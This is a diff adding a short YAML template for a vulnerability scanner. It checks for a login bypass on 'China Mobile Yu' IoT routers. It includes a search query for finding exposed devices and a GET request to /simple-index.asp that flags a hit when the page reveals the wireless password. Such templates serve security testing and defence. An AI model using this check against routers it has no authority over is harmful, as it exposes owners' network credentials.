@@ -1,0 +1,14 @@
+name: China Mobile Yu Routing Login Bypass
+manual: true
+query: body="中移"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /simple-index.asp
+    expression: response.body.bcontains(b"无线密码")
+expression: r0()
+detail:
+  description: Yu Routing is an IoT router.
+  tags: bypass
